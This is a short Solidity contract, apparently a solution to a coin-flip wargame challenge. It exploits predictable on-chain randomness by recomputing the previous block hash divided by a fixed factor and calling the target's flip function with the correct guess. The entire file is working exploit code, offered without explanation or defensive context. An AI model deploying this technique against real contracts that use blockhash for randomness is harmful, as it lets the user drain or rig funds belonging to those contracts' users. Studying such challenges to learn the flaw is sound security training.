// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public immutable target;
    uint256 public lastHash;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        require(lastHash != blockValue, "same block");

        lastHash = blockValue;

        bool guess = (blockValue / FACTOR) == 1;

        target.flip(guess);
    }
}
